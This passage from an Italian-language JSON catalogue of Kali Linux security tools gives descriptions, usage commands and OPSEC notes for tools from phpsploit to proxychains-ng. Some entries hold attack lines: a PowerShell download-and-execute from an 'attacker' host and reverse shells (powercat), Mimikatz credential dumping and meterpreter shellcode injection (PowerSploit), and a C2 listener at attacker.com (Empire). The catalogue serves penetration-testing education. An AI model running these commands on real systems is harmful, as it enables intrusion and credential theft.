rilevati.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Deserialization"
    ],
    "notes": null
  },
  {
    "id": "phpsploit",
    "name": "phpsploit",
    "version": "3.2",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/phpsploit/",
    "desc": "Framework post-exploitation per webshell PHP con tunneling e comandi stealth.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PHPSploit</strong> è un framework di post-exploitation stealth per webshell PHP. Fornisce shell interattiva con tunneling HTTP, evasione di WAF, plugin per enumeration e persistenza. Comunicazione crittografata e difficile da rilevare.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Stealth Shell:</strong> webshell minimale con payload dinamici</p><p><strong>HTTP Tunneling:</strong> tutti i comandi via richieste HTTP normali</p><p><strong>Plugin System:</strong> moduli per upload, download, privesc, persistence</p><p><strong>Encryption:</strong> comunicazione crittografata per evasione IDS</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Generazione backdoor\nphpsploit\nset TARGET http://target.com/shell.php\nrun\n\n# Esecuzione comandi\nrun system id\n\n# Upload file\nupload local_file.txt /var/www/remote.txt\n\n# Enumerazione\nrun sysinfo</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>post-exploitation</strong>, mantenimento accesso dopo upload webshell. Per <strong>red team</strong>, C2 leggero via HTTP su web server compromesso. Per <strong>pivoting</strong>, tunnel attraverso server web esposto.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>File on disk:</strong> richiede webshell persistente su filesystem. <strong>Log:</strong> richieste HTTP loggabili da web server. <strong>WAF:</strong> moduli stealth progettati per bypassare WAF comuni.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Persistence"
    ],
    "notes": null
  },
  {
    "id": "pixiewps",
    "name": "pixiewps",
    "version": "1.4.2",
    "icon": "../app/icons/pixiewps-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/pixiewps/",
    "desc": "Exploita vulnerabilità Pixie Dust in WPS per recuperare PIN e password WiFi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Pixiewps</strong> è un tool che sfrutta la vulnerabilità Pixie Dust in implementazioni WPS deboli. Permette di recuperare il PIN WPS in secondi invece di ore, analizzando i nonce scambiati durante l'handshake WPS e calcolando offline il PIN.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Pixie Dust Attack:</strong> crack PIN WPS via analisi crittografica offline</p><p><strong>Fast Recovery:</strong> recupero PIN in secondi su router vulnerabili</p><p><strong>Integration:</strong> lavora con output di reaver e bully</p><p><strong>Vendor Detection:</strong> identifica chipset vulnerabili</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Usato con output reaver\nreaver -i wlan0mon -b BSSID -vvv | tee reaver.log\npixiewps -e PKE -r PKR -s E-Hash1 -z E-Hash2 -a AuthKey\n\n# Modalità automatica con reaver\nreaver -i wlan0mon -b BSSID -K 1\n\n# Con valori manuali\npixiewps --pke PKE --pkr PKR --e-hash1 HASH1 --e-hash2 HASH2 --authkey KEY</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>WiFi pentesting</strong>, bypass WPS su router vulnerabili. Per <strong>security audit</strong>, verifica vulnerabilità Pixie Dust su infrastruttura. Per <strong>CTF</strong>, challenge WiFi con WPS abilitato.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Legalità:</strong> attacco a reti WiFi senza autorizzazione è illegale. <strong>Requisiti:</strong> funziona solo su chipset WPS vulnerabili. <strong>Mitigazione:</strong> molti vendor hanno patchato la vulnerabilità.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "plaso",
    "name": "plaso",
    "version": "20241006",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/plaso/",
    "desc": "Super timeline forensics: correla eventi da log, filesystem, registry, browser.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Plaso</strong> (Plaso Langar Að Safna Öllu) è un motore di super-timeline forensics che estrae e correla timestamp da molteplici sorgenti: filesystem, registry Windows, log eventi, browser, email. Produce timeline unificate per analisi cronologica degli eventi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-source Parsing:</strong> oltre 100 parser per formati diversi</p><p><strong>Timeline Generation:</strong> timeline unificata da tutte le sorgenti</p><p><strong>Filtering:</strong> filtri potenti per focus su periodi o tipi specifici</p><p><strong>Output Formats:</strong> CSV, JSON, Elasticsearch, Timesketch</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Estrazione da immagine disco\nlog2timeline.py timeline.plaso disk_image.dd\n\n# Da directory montata\nlog2timeline.py timeline.plaso /mnt/evidence\n\n# Generazione output CSV\npsort.py -o l2tcsv timeline.plaso > timeline.csv\n\n# Con filtro temporale\npsort.py --date-filter \"2024-01-01,2024-01-31\" timeline.plaso</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>DFIR</strong>, ricostruzione timeline completa di incidente. Per <strong>malware analysis</strong>, identificazione momento e sequenza di infezione. Per <strong>investigation</strong>, correlazione attività utente nel tempo.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Risorse:</strong> parsing completo richiede tempo e CPU significativi. <strong>Storage:</strong> file plaso possono essere molto grandi. <strong>Completezza:</strong> coverage dipende dai parser disponibili per il caso.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "05_Forensics",
      "Disk_Analysis"
    ],
    "notes": null
  },
  {
    "id": "pnscan",
    "name": "pnscan",
    "version": "1.14.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/pnscan/",
    "desc": "Port scanner multi-threaded leggero per scan rapidi su grandi range di IP.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Pnscan</strong> è un port scanner multi-threaded leggero e veloce, ottimizzato per scan rapidi su grandi range di indirizzi IP. Minimalista ma efficiente, ideale per discovery iniziale di porte aperte su intere subnet.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-threaded:</strong> scan parallelo per massima velocità</p><p><strong>Lightweight:</strong> binario minimale, poche dipendenze</p><p><strong>Range Support:</strong> supporta notation CIDR e range IP</p><p><strong>Banner Grab:</strong> opzionale cattura banner di servizi</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan porta singola su range\npnscan -p 80 192.168.1.0/24\n\n# Scan multiple porte\npnscan -p 22,80,443 192.168.1.0/24\n\n# Con banner grabbing\npnscan -b -p 22 192.168.1.0/24\n\n# Aumenta thread\npnscan -t 100 -p 80 10.0.0.0/16</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>network discovery</strong>, identificazione rapida host con porte aperte. Per <strong>mass scanning</strong>, scan di grandi network per servizio specifico. Per <strong>pre-enum</strong>, discovery prima di scan dettagliato con nmap.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rumore:</strong> scan di massa facilmente rilevabili. <strong>Rate:</strong> molti thread generano picchi di traffico. <strong>IDS:</strong> pattern scan identificabile da sistemi di detection.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Port_Scanning"
    ],
    "notes": null
  },
  {
    "id": "pocsuite3",
    "name": "pocsuite3",
    "version": "2.1.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/pocsuite3/",
    "desc": "Framework remoto per sviluppo e test di exploit PoC con integrazione Shodan/Fofa.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Pocsuite3</strong> è un framework open-source per sviluppo, test e gestione di exploit Proof-of-Concept. Sviluppato da Knownsec, integra ricerca target via Shodan, Fofa, ZoomEye per identificare host vulnerabili e testare PoC in modo automatizzato.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>PoC Development:</strong> framework strutturato per creare exploit modulari</p><p><strong>Search Integration:</strong> query dirette a Shodan, Fofa, ZoomEye per target discovery</p><p><strong>Batch Testing:</strong> test massivo di vulnerabilità su liste di target</p><p><strong>Plugin System:</strong> architettura modulare per estensioni custom</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Esecuzione PoC su singolo target\npocsuite -r poc.py -u http://target.com\n\n# Con ricerca Shodan\npocsuite -r poc.py --dork 'apache' --dork-shodan\n\n# Scan lista target\npocsuite -r poc.py -f targets.txt\n\n# Modalità verify + attack\npocsuite -r poc.py -u target --verify --attack</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>vulnerability research</strong>, sviluppo e test di nuovi exploit. Per <strong>mass scanning</strong>, verifica vulnerabilità su larga scala. Per <strong>bug bounty</strong>, automazione test su scope ampi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Attribution:</strong> query a motori di ricerca sono loggate. <strong>Legal:</strong> test su target non autorizzati è illegale. <strong>Rate limiting:</strong> API Shodan/Fofa hanno limiti di query.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "General"
    ],
    "notes": null
  },
  {
    "id": "polenum",
    "name": "polenum",
    "version": "1.6.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/polenum/",
    "desc": "Estrae password policy da domain controller Windows via RPC anonimo o autenticato.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Polenum</strong> è un tool Python che estrae la password policy di un dominio Active Directory via RPC. Può funzionare in modalità anonima (null session) o autenticata, rivelando requisiti di complessità, lunghezza minima, lockout e storia password.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Null Session:</strong> enumeration anonima se permessa dal DC</p><p><strong>Authenticated:</strong> query con credenziali di dominio valide</p><p><strong>Policy Extraction:</strong> password length, complexity, history, lockout threshold</p><p><strong>Python-based:</strong> facilmente integrabile in script automatizzati</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Tentativo con null session\npolenum -d domain.local -u '' -p '' -dc dc.domain.local\n\n# Con credenziali\npolenum -d domain.local -u user -p password -dc 192.168.1.1\n\n# Output verbose\npolenum --dc dc.domain.local -u user -p pass -v</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>AD enumeration</strong>, comprensione policy password per attacchi mirati. Per <strong>password attacks</strong>, calibrazione wordlist in base a requisiti. Per <strong>security audit</strong>, verifica configurazione policy aziendale.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Logging:</strong> query RPC loggate su domain controller. <strong>Null session:</strong> molti DC moderni bloccano sessioni anonime. <strong>Detection:</strong> enumeration AD monitorata da SIEM.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "LDAP_AD"
    ],
    "notes": null
  },
  {
    "id": "pompem",
    "name": "pompem",
    "version": "0.2.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/pompem/",
    "desc": "Cerca exploit per software specifico su multiple fonti: Exploit-DB, PacketStorm, NVD.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Pompem</strong> è un tool Python che cerca exploit pubblici per software specifico aggregando risultati da multiple fonti: Exploit-DB, PacketStorm, WPScan Vulnerability Database e altri. Automatizza la ricerca di PoC disponibili per versioni software identificate.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-source Search:</strong> query parallele su database exploit multipli</p><p><strong>Version Matching:</strong> ricerca per nome software e versione specifica</p><p><strong>Output Structured:</strong> risultati con link diretti agli exploit</p><p><strong>Offline Mode:</strong> può usare database locale di Exploit-DB</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Ricerca exploit per software\npompem -s \"Apache 2.4.49\"\n\n# Ricerca WordPress plugin\npompem -s \"WordPress contact form 7\"\n\n# Output su file\npompem -s \"OpenSSH 7.2\" -o results.txt\n\n# Ricerca con filtro tipo\npompem -s \"nginx\" --type remote</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>vulnerability assessment</strong>, identificazione rapida exploit disponibili. Per <strong>pentest</strong>, ricerca PoC dopo enumeration servizi. Per <strong>patching prioritization</strong>, verifica se esistono exploit pubblici.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Pubblico:</strong> solo query a database pubblici, nessun rischio diretto. <strong>Verification:</strong> exploit trovati vanno testati e verificati. <strong>Updates:</strong> database potrebbero non essere aggiornati in tempo reale.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Vulnerability_Scanning"
    ],
    "notes": null
  },
  {
    "id": "portspoof",
    "name": "portspoof",
    "version": "1.3",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/portspoof/",
    "desc": "Honeypot che risponde su tutte le porte TCP con fake services per confondere scanner.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Portspoof</strong> è un tool di deception che risponde su tutte le 65535 porte TCP con banner di servizi fake. Confonde port scanner facendo apparire ogni porta come aperta con servizi diversi, rendendo la reconnaissance estremamente difficile.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Full Port Response:</strong> tutte le porte appaiono aperte e attive</p><p><strong>Fake Banners:</strong> signature di servizi casuali o configurabili</p><p><strong>Scanner Confusion:</strong> nmap e altri tool ricevono risultati inutili</p><p><strong>Logging:</strong> registra tentativi di connessione per threat intel</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvio base con iptables redirect\niptables -t nat -A PREROUTING -p tcp --dport 1:65535 -j REDIRECT --to-port 4444\nportspoof -c portspoof.conf -s portspoof_signatures -D\n\n# Con logging verboso\nportspoof -l /var/log/portspoof.log\n\n# Porta listener custom\nportspoof -p 8080</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>defense</strong>, protezione sistemi confondendo attaccanti. Per <strong>honeypot</strong>, rilevamento scan e raccolta intelligence. Per <strong>red team</strong>, test di tool di reconnaissance contro deception.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Risorse:</strong> gestire 65535 porte richiede tuning. <strong>Fingerprinting:</strong> attaccanti esperti possono riconoscere pattern portspoof. <strong>False positives:</strong> può interferire con servizi legittimi.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "04_Red_Team",
      "Evasion"
    ],
    "notes": null
  },
  {
    "id": "poshc2",
    "name": "poshc2",
    "version": "9.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/poshc2/",
    "desc": "Framework C2 con implant PowerShell, C#, Python per operazioni red team avanzate.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PoshC2</strong> è un framework Command and Control proxy-aware per red team e penetration testing. Supporta implant in PowerShell, C#, Python con comunicazione crittografata, moduli post-exploitation integrati e gestione multi-operatore.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-language Implants:</strong> payload PowerShell, C#, Python per diversi ambienti</p><p><strong>Proxy-aware:</strong> comunicazione attraverso proxy aziendali</p><p><strong>HTTPS C2:</strong> traffico crittografato che mimetizza comunicazioni legittime</p><p><strong>Module Library:</strong> mimikatz, persistence, lateral movement integrati</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Setup server PoshC2\nposh-server\n\n# Generazione payload\nposh-config\nposh-implantgen\n\n# Connessione al framework\nposh-client\n\n# Esecuzione modulo su implant\nloadmodule Invoke-Mimikatz.ps1</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>red team</strong>, operazioni C2 complete su target Windows/Linux. Per <strong>adversary simulation</strong>, emulazione TTP di threat actors. Per <strong>pentest</strong>, post-exploitation con persistenza.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Signatures:</strong> implant noti, possono essere rilevati da EDR. <strong>Malleable:</strong> profili C2 customizzabili per evasione. <strong>Logging:</strong> mantenere operational security sui log del server.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "04_Red_Team",
      "C2_Frameworks"
    ],
    "notes": null
  },
  {
    "id": "powercat",
    "name": "powercat",
    "version": "0.0~git20240305.4e33fdf",
    "icon": "../app/icons/powercat-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/powercat/",
    "desc": "Netcat in PowerShell: trasferimento file, shell, relay TCP con funzionalità avanzate.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Powercat</strong> è una reimplementazione di netcat in puro PowerShell. Fornisce trasferimento file, reverse/bind shell, port relay e supporto per payload encoded. Essenziale per post-exploitation su Windows senza necessità di binari esterni.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Reverse Shell:</strong> connessioni outbound verso listener attacker</p><p><strong>Bind Shell:</strong> shell in ascolto su porta locale</p><p><strong>File Transfer:</strong> upload/download file via TCP</p><p><strong>Relay Mode:</strong> port forwarding e pivoting</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Import del modulo\nIEX (New-Object Net.WebClient).DownloadString('http://attacker/powercat.ps1')\n\n# Reverse shell\npowercat -c attacker_ip -p 4444 -e cmd.exe\n\n# Bind shell\npowercat -l -p 8080 -e powershell.exe\n\n# File transfer\npowercat -c target -p 9999 -i C:\\file.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>post-exploitation</strong>, shell interattive senza upload binari. Per <strong>pivoting</strong>, relay di connessioni attraverso host compromessi. Per <strong>exfiltration</strong>, trasferimento file via canali TCP.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>AMSI:</strong> script PowerShell soggetto a AMSI detection. <strong>Logging:</strong> PowerShell script block logging cattura comandi. <strong>Evasion:</strong> richiede obfuscation per bypass AV moderni.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "powershell-empire",
    "name": "powershell-empire",
    "version": "6.1.2",
    "icon": "../app/icons/powershell-empire-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/powershell-empire/",
    "desc": "Framework C2 post-exploitation con agent PowerShell/Python, moduli e evasion integrata.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PowerShell Empire</strong> è un framework C2 post-exploitation maturo con agent PowerShell e Python. Offre centinaia di moduli per credential harvesting, lateral movement, persistence e privilege escalation con comunicazione crittografata e capacità di evasione.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-platform Agents:</strong> PowerShell per Windows, Python per Linux/macOS</p><p><strong>Module Library:</strong> oltre 300 moduli per ogni fase post-exploitation</p><p><strong>Listener Types:</strong> HTTP, HTTPS, COM, foreign listeners</p><p><strong>Evasion:</strong> obfuscation integrata, bypass AMSI, malleable C2</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvio Empire\nsudo powershell-empire server\npowershell-empire client\n\n# Creazione listener\nuselistener http\nset Host http://attacker.com\nexecute\n\n# Generazione stager\nusestager windows/launcher_bat\nset Listener http\nexecute</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>red team</strong>, operazioni C2 complete con ampia libreria di moduli. Per <strong>adversary emulation</strong>, simulazione APT con TTP realistiche. Per <strong>training</strong>, ambiente controllato per praticare post-exploitation.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Signatures:</strong> stager Empire molto noti, detection alta. <strong>Obfuscation:</strong> usare opzioni di evasion built-in. <strong>Infra:</strong> C2 server deve essere hardened e isolato.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "04_Red_Team",
      "C2_Frameworks"
    ],
    "notes": null
  },
  {
    "id": "powersploit",
    "name": "powersploit",
    "version": "3.0.0",
    "icon": "../app/icons/powersploit-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/powersploit/",
    "desc": "Moduli PowerShell per code execution, persistence, bypass, exfiltration ed escalation.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PowerSploit</strong> è una collezione di moduli PowerShell per penetration testing sviluppata da PowerShellMafia. Include script per code execution, persistence, bypass di security controls, privilege escalation, exfiltration e reconnaissance su sistemi Windows.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>CodeExecution:</strong> Invoke-Shellcode, Invoke-DllInjection per esecuzione payload</p><p><strong>Persistence:</strong> moduli per registry, scheduled tasks, WMI persistence</p><p><strong>Privesc:</strong> PowerUp per identificazione e sfruttamento vettori escalation</p><p><strong>Exfiltration:</strong> Out-Minidump, Invoke-NinjaCopy per dump credenziali</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Import modulo\nImport-Module PowerSploit\n\n# Privilege escalation check\nInvoke-AllChecks\n\n# Mimikatz in-memory\nInvoke-Mimikatz -DumpCreds\n\n# Shellcode injection\nInvoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost attacker -Lport 443</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>post-exploitation</strong>, toolkit completo per azioni su Windows compromesso. Per <strong>privesc</strong>, identificazione automatica vulnerabilità locali. Per <strong>credential access</strong>, dump memoria e SAM.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> moduli molto noti, signature in tutti gli AV. <strong>AMSI:</strong> rilevato da AMSI, richiede bypass. <strong>Logging:</strong> PowerShell logging cattura tutto.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Privilege_Escalation",
      "Windows"
    ],
    "notes": null
  },
  {
    "id": "proxify",
    "name": "proxify",
    "version": "0.0.5",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/proxify/",
    "desc": "Proxy HTTP/HTTPS per logging e matching traffic con output strutturato e filtri.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Proxify</strong> è un proxy HTTP/HTTPS sviluppato da ProjectDiscovery per logging, filtering e matching del traffico web. Cattura richieste e risposte con output strutturato, filtri regex e integrazione con altri tool della suite.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Traffic Logging:</strong> cattura completa di request/response HTTP(S)</p><p><strong>Pattern Matching:</strong> filtri regex per identificare dati specifici</p><p><strong>Structured Output:</strong> JSON, file per integrazione con altri tool</p><p><strong>TLS Interception:</strong> supporto HTTPS con certificato custom</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvio proxy base\nproxify\n\n# Con porta e output custom\nproxify -addr :8888 -o traffic.log\n\n# Filtro su pattern\nproxify -match-string \"password\"\n\n# Export JSON\nproxify -json -o requests.json</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>web testing</strong>, analisi traffico durante pentest applicazioni. Per <strong>debugging</strong>, ispezione request/response per troubleshooting. Per <strong>data discovery</strong>, identificazione leak di dati sensibili.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Certificato:</strong> HTTPS interception richiede CA installata sul client. <strong>Storage:</strong> logging completo genera file grandi. <strong>Privacy:</strong> traffico catturato può contenere dati sensibili.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Proxy_MITM"
    ],
    "notes": null
  },
  {
    "id": "proximoth",
    "name": "proximoth",
    "version": "1.0.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/proximoth/",
    "desc": "Exploita vulnerabilità F2FS control frame per attacchi su filesystem moderni.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Proximoth</strong> è un tool specializzato per exploitare vulnerabilità nel filesystem F2FS (Flash-Friendly File System) utilizzato in dispositivi Android e storage moderni. Permette attacchi tramite manipolazione di control frame e metadata.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>F2FS Exploitation:</strong> sfrutta vulnerabilità specifiche del filesystem</p><p><strong>Control Frame Manipulation:</strong> modifica strutture di controllo F2FS</p><p><strong>Metadata Attacks:</strong> corruzione controllata di metadata</p><p><strong>Research Tool:</strong> analisi vulnerabilità filesystem moderni</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Analisi partizione F2FS\nproximoth -d /dev/sdb1 -a analyze\n\n# Exploitation di vulnerabilità\nproximoth -d /dev/sdb1 -e control_frame\n\n# Dump metadata\nproximoth -d /dev/sdb1 --dump-meta</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>mobile forensics</strong>, analisi partizioni F2FS su dispositivi Android. Per <strong>security research</strong>, studio vulnerabilità filesystem flash. Per <strong>data recovery</strong>, recupero dati da F2FS corrotti.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Distruttivo:</strong> manipolazione filesystem può causare perdita dati. <strong>Specifico:</strong> funziona solo su F2FS, non altri filesystem. <strong>Privilegi:</strong> richiede accesso raw al device.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "General"
    ],
    "notes": null
  },
  {
    "id": "proxmark3",
    "name": "proxmark3",
    "version": "4.18994",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/proxmark3/",
    "desc": "Toolkit RFID/NFC completo: clonazione badge, sniffing, cracking Mifare e HID iClass.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Proxmark3</strong> è il toolkit hardware/software più completo per RFID e NFC security research. Supporta lettura, scrittura, clonazione e cracking di card Mifare, HID iClass, EM4100 e molti altri standard. Strumento essenziale per physical security assessment.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-frequency:</strong> supporta 125kHz (LF) e 13.56MHz (HF)</p><p><strong>Mifare Cracking:</strong> attacchi nested, hardnested, darkside su Mifare Classic</p><p><strong>HID Cloning:</strong> lettura e clonazione badge HID Prox e iClass</p><p><strong>Sniffing:</strong> cattura comunicazioni reader-card</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Identificazione card sconosciuta\npm3 --> auto\n\n# Lettura Mifare Classic\npm3 --> hf mf rdbl -b 0 -k FFFFFFFFFFFF\n\n# Cracking chiavi Mifare\npm3 --> hf mf autopwn\n\n# Clonazione HID\npm3 --> lf hid clone -r 200670012F</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>physical pentest</strong>, clonazione badge per bypass controllo accessi. Per <strong>security audit</strong>, verifica vulnerabilità sistema RFID aziendale. Per <strong>research</strong>, analisi sicurezza nuovi standard RFID/NFC.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Legalità:</strong> clonazione badge senza autorizzazione è illegale. <strong>Hardware:</strong> richiede dispositivo Proxmark3. <strong>Prossimità:</strong> alcune operazioni richiedono vicinanza fisica alla card.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "RFID_NFC"
    ],
    "notes": null
  },
  {
    "id": "proxychains-ng",
    "name": "proxychains-ng",
    "version": "4.17",
    "icon": "../app/icons/proxychains-ng-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/proxychains-ng/",
    "desc": "Forza qualsiasi tool TCP attraverso proxy SOCKS/HTTP per pivoting e anonimizzazione.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Proxychains-ng</strong> forza qualsiasi applicazione TCP attraverso proxy SOCKS4/5 o HTTP senza modifiche al codice. Essenziale per pivoting attraverso host compromessi, anonimizzazione via Tor, e accesso a reti interne da jump host.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Transparent Proxying:</strong> hook di connessioni TCP senza modifiche all'applicazione</p><p><strong>Chain Types:</strong> dynamic, strict, random per catene di proxy</p><p><strong>Multi-proxy:</strong> supporto catene SOCKS4, SOCKS5, HTTP</p><p><strong>DNS Proxying:</strong> opzione per risolvere DNS attraverso proxy</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Configurazione in /etc/proxychains.conf\n# socks5 127.0.0.1 1080\n\n# Esecuzione nmap attraverso proxy\nproxychains nmap -sT target\n\n# SSH attraverso catena proxy\nproxychains ssh user@internal_host\n\n# Con Tor\nproxychains4 curl http://check.torproject.org</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>pivoting</strong>, accesso a reti interne via host compromesso. Per <strong>anonimizzazione</strong>, routing traffico attraverso Tor. Per <strong>bypass</strong>, evasione di restrizioni di rete.</p><br><hr><h4 